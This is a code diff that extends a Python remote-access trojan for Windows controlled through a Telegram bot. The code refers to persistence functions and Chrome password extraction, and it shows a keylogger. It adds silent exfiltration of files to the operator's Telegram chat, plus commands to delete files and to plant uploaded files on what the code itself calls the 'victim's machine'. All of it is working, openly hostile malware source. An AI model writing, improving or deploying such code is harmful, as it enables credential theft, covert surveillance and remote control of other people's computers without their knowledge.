@@ -1,3 +1,6 @@
+from dotenv import load_dotenv
+load_dotenv()  # Load environment variables from .env file
+
 import subprocess
 import socket
 import win32clipboard
@@ -7,7 +10,7 @@ import requests
 import logging
 import pathlib
 import json
-from telegram.ext import Updater, CommandHandler, MessageHandler, filters, ApplicationBuilder
+from telegram.ext import Updater, CommandHandler, MessageHandler, filters, ApplicationBuilder, ConversationHandler
 from telegram import Update
 import telegram
 import time
@@ -25,11 +28,11 @@ from PIL import ImageGrab
 from scipy.io.wavfile import write as write_rec
 from cryptography.fernet import Fernet
 import tempfile
-import psutil
 from Crypto.Cipher import AES
 import winreg
+import ctypes
+from ctypes import wintypes
 
-################ Configuration: Base Path and Default Settings ################
 
 # Get Windows username dynamically
 WINDOWS_USERNAME = os.getenv('USERNAME')
@@ -40,6 +43,7 @@ BASE_LOG_PATH.mkdir(parents=True, exist_ok=True)
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
+
 
 ################ Persistence Functions - MATCHES TECHNIQUE 2 ################
 
@@ -178,18 +182,53 @@ def send_telegram_file(file_path, caption="", chat_id=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
     
     try:
+        # Check if file exists and is not empty
+        if not os.path.exists(file_path):
+            logging.error(f'File not found: {file_path}')
+            return None
+            
+        if os.path.getsize(file_path) == 0:
+            logging.error(f'Empty file: {file_path}')
+            return None
+            
+        # Telegram has 50MB file size limit for documents
+        if os.path.getsize(file_path) > 45 * 1024 * 1024:  # 45MB to be safe
+            logging.error(f'File too large: {file_path}')
+            return None
+            
         with open(file_path, 'rb') as file:
             files = {'document': file}
-            data = {'chat_id': chat_id}
+            data = {
+                'chat_id': chat_id,
+                'disable_notification': True
+            }
             if caption:
                 data['caption'] = caption[:1024]
             
-            response = requests.post(url, files=files, data=data, timeout=30)
+            response = requests.post(url, files=files, data=data, timeout=60)
             response.raise_for_status()
+            
+            # Check for Telegram API errors in response
+            if not response.json().get('ok'):
+                error_msg = response.json().get('description', 'Unknown Telegram API error')
+                logging.error(f'Telegram API error: {error_msg}')
+                return None
+                
             return response.json()
+            
+    except requests.exceptions.HTTPError as e:
+        logging.error(f'HTTP error sending {file_path}: {e.response.text}')
     except Exception as e:
-        logging.error(f'Telegram file sending error for {file_path}: {e}')
-        return None
+        logging.error(f'Error sending {file_path}: {str(e)}')
+        # Try sending as text if it's a text file
+        if file_path.endswith('.txt'):
+            try:
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    text_content = f.read(4096)  # First 4KB
+                    return send_telegram_message(f"📄 {caption}\n{text_content}")
+            except:
+                pass
+    return None
 
 ################ Chrome Password Extraction - FIXED VERSION ################
 
@@ -520,17 +559,38 @@ def main():
                 with open(keylog_file, 'w', encoding='utf-8') as f:
                     def on_press(key):
                         try:
-                            f.write(f"{time.strftime('%H:%M:%S')} - {key}\n")
-                            f.flush()
-                        except:
-                            pass
+                            # Handle special keys and regular characters
+                            if hasattr(key, 'char') and key.char:
+                                char = key.char
+                            elif key == Key.space:
+                                char = ' '
+                            elif key == Key.enter:
+                                char = '\n'
+                            else:
+                                char = f'[{key}]'
+                            
+                            if char:
+                                f.write(f"{time.strftime('%H:%M:%S')} - {char}\n")
+                                f.flush()
+                        except Exception as e:
+                            logging.error(f'Key press handling error: {e}')
+
+                    # Ensure proper listener cleanup
+                    listener = Listener(on_press=on_press)
+                    listener.start()
                     
-                    from pynput.keyboard import Listener
-                    with Listener(on_press=on_press) as listener:
-                        time.sleep(60)  # Only 60 seconds
-                        listener.stop()
+                    # Log for 60 seconds
+                    time.sleep(60)
+                    listener.stop()
+                    listener.join()
+                    
+                    # Verify file content
+                    if os.path.getsize(keylog_file) == 0:
+                        f.write("No keystrokes detected during monitoring period\n")
+                        f.flush()
             except Exception as e:
                 logging.error(f'Keylogger error: {e}')
+                send_telegram_message(f"❌ Keylogger failed: {str(e)[:200]}")
         
         # Run keylogger in separate thread
         import threading
@@ -642,6 +702,8 @@ def main():
 /list [path] - List directory contents
 /cd [path] - Change current directory
 /zip [path] - Zip and send directory/file
+/remove [path] - Remove file
+/add - add file
 Current directory: {current_dir}
             """, parse_mode='HTML')
 
@@ -707,6 +769,25 @@ Current directory: {current_dir}
             except Exception as e:
                 logging.error(f"Zip error: {e}")
                 await update.message.reply_text("❌ Error creating zip archive")
+        
+        # Enhanced remove command handler (handles both files and directories)
+        async def remove_file(update: Update, context):
+            if not context.args:
+                await update.message.reply_text("Please specify a file or directory path.")
+                return
+            target_path = context.args[0]
+            try:
+                if os.path.isfile(target_path):
+                    os.remove(target_path)
+                    await update.message.reply_text(f"✅ File '{target_path}' deleted successfully.")
+                elif os.path.isdir(target_path):
+                    shutil.rmtree(target_path)
+                    await update.message.reply_text(f"✅ Directory '{target_path}' and its contents deleted successfully.")
+                else:
+                    await update.message.reply_text(f"❌ Path '{target_path}' does not exist.")
+            except Exception as e:
+                await update.message.reply_text(f"❌ Error deleting: {str(e)}")
+
 
         # Start the bot
         application = ApplicationBuilder().token(BOT_TOKEN).build()
@@ -714,6 +795,50 @@ Current directory: {current_dir}
         application.add_handler(CommandHandler("list", list_dir))
         application.add_handler(CommandHandler("cd", change_dir))
         application.add_handler(CommandHandler("zip", zip_dir_cmd))
+        application.add_handler(CommandHandler("remove", remove_file))
+        
+        # Add command handler for file uploads
+        async def add_file(update: Update, context):
+            """Handler for /add command: upload a file to victim's machine"""
+            # Ask user to drop the file
+            await update.message.reply_text("📤 Please drop the file you want to upload")
+            # Set state to wait for file
+            context.user_data['expecting_file'] = True
+
+        async def handle_document(update: Update, context):
+            """Handler for document messages (file uploads)"""
+            if context.user_data.get('expecting_file'):
+                # Get the uploaded file
+                file_id = update.message.document.file_id
+                file_name = update.message.document.file_name or "uploaded_file"
+                
+                # Ask for destination path
+                await update.message.reply_text("📁 Where should I save this file? Please provide full path:")
+                # Store file info and set next state
+                context.user_data['file_id'] = file_id
+                context.user_data['file_name'] = file_name
+                context.user_data['expecting_file'] = False
+                context.user_data['expecting_destination'] = True
+            elif context.user_data.get('expecting_destination'):
+                # Get destination path from message
+                dest_path = update.message.text.strip()
+                
+                # Download and save the file
+                file = await context.bot.get_file(context.user_data['file_id'])
+                file_path = os.path.join(dest_path, context.user_data['file_name'])
+                await file.download_to_drive(file_path)
+                
+                await update.message.reply_text(f"✅ File saved to {file_path}")
+                
+                # Clear state
+                context.user_data.pop('expecting_destination', None)
+                context.user_data.pop('file_id', None)
+                context.user_data.pop('file_name', None)
+
+        # Register handlers
+        application.add_handler(CommandHandler("add", add_file))
+        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_document))
         
         send_telegram_message("✅ <b>Interactive bot ready. Use /start to begin.</b>")
         application.run_polling()
